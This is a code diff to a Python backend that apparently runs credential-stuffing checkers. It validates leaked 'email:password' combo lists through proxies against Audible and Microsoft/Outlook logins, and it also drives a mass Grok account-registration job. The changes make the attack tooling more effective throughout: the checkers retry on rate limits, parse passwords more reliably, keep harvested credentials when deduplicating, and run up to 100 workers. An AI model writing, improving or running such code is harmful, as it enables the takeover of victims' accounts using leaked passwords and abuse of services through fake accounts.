@@ -146,6 +146,20 @@ def _append_log(message: str) -> None:
 _sessions: Dict[str, float] = {}
 _SESSION_LOCK = threading.Lock()
 _SESSION_TTL = 86400 * 7
+_SESSION_LAST_PURGE = 0.0
+
+
+def _purge_expired_sessions() -> None:
+    """Remove expired tokens. Called at most once per minute."""
+    global _SESSION_LAST_PURGE
+    now = time.time()
+    if now - _SESSION_LAST_PURGE < 60:
+        return
+    _SESSION_LAST_PURGE = now
+    with _SESSION_LOCK:
+        expired = [k for k, exp in _sessions.items() if exp <= now]
+        for k in expired:
+            del _sessions[k]
 
 # ponytail: in-memory per-IP rate-limit for /api/auth (anti brute-force);
 # enough for single-user self-host, use a reverse-proxy limit for multi-replica
@@ -168,6 +182,7 @@ def _safe_compare(a: str, b: str) -> bool:
 def _require_auth(x_access_key: Optional[str]) -> None:
     if not AUTH_ENABLED:
         return
+    _purge_expired_sessions()
     key = (x_access_key or "").strip()
     if not key:
         raise HTTPException(status_code=401, detail="access key required")
@@ -272,14 +287,15 @@ def _audible_reset(total: int) -> None:
 
 def _audible_add_result(email: str, password: str, status: str, note: str) -> None:
     with _AUDIBLE_LOCK:
-        # Dedup: keep latest entry per email, undo old counter first.
-        existing_idx = next(
-            (i for i, r in enumerate(_AUDIBLE_STATE["results"]) if r["email"] == email),
-            None,
-        )
+        # O(1) dedup via index dict
+        idx_map = {r["email"]: i for i, r in enumerate(_AUDIBLE_STATE["results"])}
+        existing_idx = idx_map.get(email)
         entry = {"email": email, "password": password, "status": status, "note": note}
         if existing_idx is not None:
             old = _AUDIBLE_STATE["results"][existing_idx]
+            # If new parse has empty password but old has one, keep old password
+            if not password and old.get("password"):
+                entry["password"] = old["password"]
             if old["status"] == "ok":
                 _AUDIBLE_STATE["hits"] = max(0, _AUDIBLE_STATE["hits"] - 1)
             elif old["status"] == "fail":
@@ -320,15 +336,18 @@ def _run_audible(
             # proxy_file may be either raw content (from browser upload) or a path.
             # Guard Path() against OS filename-too-long (Errno 36) on large content strings.
             is_path = False
+            src = None
             if len(proxy_file) < 512 and "\n" not in proxy_file:
                 try:
                     src = Path(proxy_file)
                     is_path = src.is_file()
                 except OSError:
                     is_path = False
-            if is_path:
+            if is_path and src:
+                with open(src, "r", encoding="utf-8", errors="replace") as src_fh:
+                    proxy_content = src_fh.read()
                 with open(proxy_path, "w", encoding="utf-8") as fh:
-                    fh.write(open(src, "r", encoding="utf-8", errors="replace").read())  # type: ignore[name-defined]
+                    fh.write(proxy_content)
                 _append_log(f"[*] audible: proxy list loaded from file ({src.name})")  # type: ignore[name-defined]
             else:
                 # Raw content sent from browser
@@ -376,18 +395,20 @@ def _run_audible(
             _append_log(f"[audible] {line}")
             # The runner prints each result twice: a progress line
             # "[ 1/3] (33%) user → label" and a raw "user:pw (label)" dump at
-            # the end. Only count the progress line; the dump would double
-            # every row in /api/audible/status.
-            if not re.match(r"^\[\s*\d+/\d+\]", line):
-                parsed = None
-            else:
-                parsed = _audible_parse_line(line)
+            # the end. The progress line may use → (no password) or : (with
+            # password). The dump always has user:pw (label). Parse both so
+            # passwords are available during live run (dedup keeps latest).
+            parsed = _audible_parse_line(line)
             if parsed:
                 _audible_add_result(*parsed)
             if _AUDIBLE_STOP.is_set():
                 proc.terminate()
+                try:
+                    proc.wait(timeout=5)
+                except subprocess.TimeoutExpired:
+                    proc.kill()
                 break
-        proc.wait()
+        proc.wait(timeout=300)
         _append_log(f"[*] audible: process exited rc={proc.returncode}")
     except Exception as exc:  # noqa: BLE001
         _append_log(f"[-] audible: {exc}")
@@ -459,7 +480,7 @@ def _restore_audible_results() -> None:
     """
     if not RESULTS_FILE.exists():
         return
-    seen: set = set()
+    seen: dict = {}  # email -> index in results list (keep LATEST, same as live run)
     hits = fails = checks = 0
     for ln in RESULTS_FILE.read_text(encoding="utf-8").splitlines():
         ln = ln.strip()
@@ -469,18 +490,21 @@ def _restore_audible_results() -> None:
         if not parsed:
             continue
         email, password, status, note = parsed
+        entry = {"email": email, "password": password, "status": status, "note": note}
         if email in seen:
-            continue  # keep the FIRST occurrence (matches live-run ordering)
-        seen.add(email)
-        _AUDIBLE_STATE["results"].append(
-            {"email": email, "password": password, "status": status, "note": note}
-        )
-        if status == "ok":
-            hits += 1
-        elif status == "fail":
-            fails += 1
+            # Undo old counter
+            idx = seen[email]
+            old = _AUDIBLE_STATE["results"][idx]
+            if old["status"] == "ok": hits -= 1
+            elif old["status"] == "fail": fails -= 1
+            else: checks -= 1
+            _AUDIBLE_STATE["results"][idx] = entry
         else:
-            checks += 1
+            seen[email] = len(_AUDIBLE_STATE["results"])
+            _AUDIBLE_STATE["results"].append(entry)
+        if status == "ok": hits += 1
+        elif status == "fail": fails += 1
+        else: checks += 1
     _AUDIBLE_STATE["hits"] = hits
     _AUDIBLE_STATE["fails"] = fails
     _AUDIBLE_STATE["checks"] = checks
@@ -508,7 +532,13 @@ async def api_audible_start(
         parts = line.split(":", 1)
         if len(parts) != 2:
             continue
-        accounts.append((parts[0].strip(), parts[1].strip()))
+        email = parts[0].strip()
+        # Strip trailing notes/labels after password: "pass - note", "pass (label)", "pass | info"
+        raw_pass = parts[1].strip()
+        password = re.split(r"\s+[-|(]", raw_pass, maxsplit=1)[0].strip()
+        if not email or not password:
+            continue
+        accounts.append((email, password))
     if not accounts:
         raise HTTPException(status_code=400, detail="no valid email:password lines")
     if body.limit:
@@ -871,6 +901,24 @@ def _restore_outlook_results() -> None:
             "found": int(fm.group(1)) if fm else 0,
         })
         hits += 1
+    bad_path = _OUTLOOK_RESULTS_FILE.parent / "outlook_bad.txt"
+    if bad_path.exists():
+        for ln in bad_path.read_text(encoding="utf-8").splitlines():
+            ln = ln.strip()
+            if not ln:
+                continue
+            m = re.match(r"^([^:]+):(\S*)\s*\|\s*Status:\s*bad\s*$", ln)
+            if not m:
+                continue
+            em, pw = m.group(1).strip(), m.group(2)
+            if em in seen:
+                continue
+            seen.add(em)
+            _OUTLOOK_STATE["results"].append({
+                "email": em, "password": pw, "status": "bad",
+                "name": "", "country": "", "found": 0,
+            })
+            bad += 1
     _OUTLOOK_STATE["hits"] = hits
     _OUTLOOK_STATE["bad"] = bad
     _OUTLOOK_STATE["found"] = found
@@ -933,7 +981,7 @@ def _msft_submit_creds(session, url_post: str, ppft: str, nonce: str,
     except Exception:
         return None
     if r.status_code == 429:
-        return None
+        return "__rate_limited__"
     location = r.headers.get("Location", "")
     # 2026-09: MS returns 302+Location only on SUCCESS. On bad password it now
     # returns 200 + a re-rendered login page carrying sErrTxt (no redirect).
@@ -1107,11 +1155,10 @@ def _run_outlook_account(email: str, password: str, proxy: Optional[Dict],
         session.proxies.update(proxy)
     session.headers["User-Agent"] = _MSFT_UA_BROWSER
 
-    max_retries = 9_999_999
+    max_retries = 10
     for attempt in range(max_retries):
         if _OUTLOOK_STOP.is_set():
-            with _OUTLOOK_LOCK:
-                _OUTLOOK_STATE["bad"] += 1
+            _outlook_add_result(email, password, "bad", "", "", 0)
             return
 
         try:
@@ -1124,8 +1171,14 @@ def _run_outlook_account(email: str, password: str, proxy: Optional[Dict],
 
             code = _msft_submit_creds(session, page["url_post"], page["ppft"],
                                        page["nonce"], email, password)
+            if code == "__rate_limited__":
+                # 429 rate limited — retry, don't mark as bad
+                with _OUTLOOK_LOCK:
+                    _OUTLOOK_STATE["retries"] += 1
+                time.sleep(2.0)
+                continue
             if code == "":
-                # 429 / rate limited
+                # Empty string: other transient error
                 with _OUTLOOK_LOCK:
                     _OUTLOOK_STATE["retries"] += 1
                 time.sleep(1.0)
@@ -1172,6 +1225,7 @@ def _run_outlook_account(email: str, password: str, proxy: Optional[Dict],
             return
 
         except Exception as exc:
+            _append_log(f"[!] outlook retry {attempt+1}/{max_retries} for {email}: {exc}")
             with _OUTLOOK_LOCK:
                 _OUTLOOK_STATE["retries"] += 1
             time.sleep(0.5)
@@ -1249,10 +1303,9 @@ def _run_outlook(accounts: List[Tuple[str, str]], mode: str, keyword: str,
             done[0] += 1
             pct = done[0] / total * 100
             with _OUTLOOK_LOCK:
-                h = _OUTLOOK_STATE["hits"]
-                b = _OUTLOOK_STATE["bad"]
-                f = _OUTLOOK_STATE["found"]
-            _append_log(f"[{done[0]:>4}/{total}] ({pct:5.1f}%) {em} → {'HIT' if h else 'bad'}")
+                last_result = _OUTLOOK_STATE["results"][-1] if _OUTLOOK_STATE["results"] else None
+                last_status = last_result["status"] if last_result and last_result["email"] == em else "?"
+            _append_log(f"[{done[0]:>4}/{total}] ({pct:5.1f}%) {em} → {last_status.upper()}")
 
     try:
         with __import__("concurrent.futures", fromlist=["ThreadPoolExecutor"]).ThreadPoolExecutor(
@@ -1292,7 +1345,11 @@ async def api_outlook_start(
             continue
         parts = line.split(":", 1)
         if len(parts) == 2:
-            accounts.append((parts[0].strip(), parts[1].strip()))
+            email = parts[0].strip()
+            raw_pass = parts[1].strip()
+            password = re.split(r"\s+[-|(]", raw_pass, maxsplit=1)[0].strip()
+            if email and password:
+                accounts.append((email, password))
     if not accounts:
         raise HTTPException(status_code=400, detail="no valid email:password lines")
     workers = body.workers or (15 if body.mode == "inboxer" else 100)
@@ -1404,6 +1461,7 @@ GROK_RESULTS_FILE = GROK_DIR / "accounts.jsonl"
 _GROK_LOCK = threading.RLock()  # RLock: _grok_rescan holds it and calls _grok_add_result
 _GROK_STOP = threading.Event()
 _GROK_SEEN: set = set()
+_GROK_SCAN_OFFSET = 0  # byte offset into accounts.jsonl — only read new data
 _GROK_STATE: Dict[str, Any] = {
     "running": False,
     "done": False,
@@ -1418,6 +1476,7 @@ _GROK_STATE: Dict[str, Any] = {
 
 
 def _grok_reset(total: int) -> None:
+    global _GROK_SCAN_OFFSET
     with _GROK_LOCK:
         _GROK_STATE.update(
             running=True, done=False, total=total, ok=0, fail=0,
@@ -1425,6 +1484,7 @@ def _grok_reset(total: int) -> None:
         )
         _GROK_STOP.clear()
         _GROK_SEEN.clear()
+        _GROK_SCAN_OFFSET = 0
 
 
 def _grok_parse_line(line: str) -> Optional[Tuple[str, str, str, str]]:
@@ -1474,20 +1534,24 @@ def _grok_add_result(email: str, password: str, status: str, note: str) -> None:
 
 
 def _grok_rescan() -> None:
-    """Re-read accounts.jsonl and add any records we have not seen yet.
-
-    mass_regist appends one JSON record per finished account (ok or fail) —
-    it does not print an `email:pass (ok)` progress line, so this file is
-    the only source of truth for results.
-    """
-    global _GROK_SEEN
+    """Re-read NEW records from accounts.jsonl (incremental via byte offset)."""
+    global _GROK_SCAN_OFFSET
     try:
-        lines = GROK_RESULTS_FILE.read_text(encoding="utf-8", errors="replace").splitlines()
+        fsize = GROK_RESULTS_FILE.stat().st_size
+    except OSError:
+        return
+    if fsize <= _GROK_SCAN_OFFSET:
+        return
+    try:
+        with open(GROK_RESULTS_FILE, "r", encoding="utf-8", errors="replace") as fh:
+            fh.seek(_GROK_SCAN_OFFSET)
+            new_data = fh.read()
+            _GROK_SCAN_OFFSET = fh.tell()
     except OSError:
         return
     added = 0
     with _GROK_LOCK:
-        for line in lines:
+        for line in new_data.splitlines():
             line = line.strip()
             if not line:
                 continue
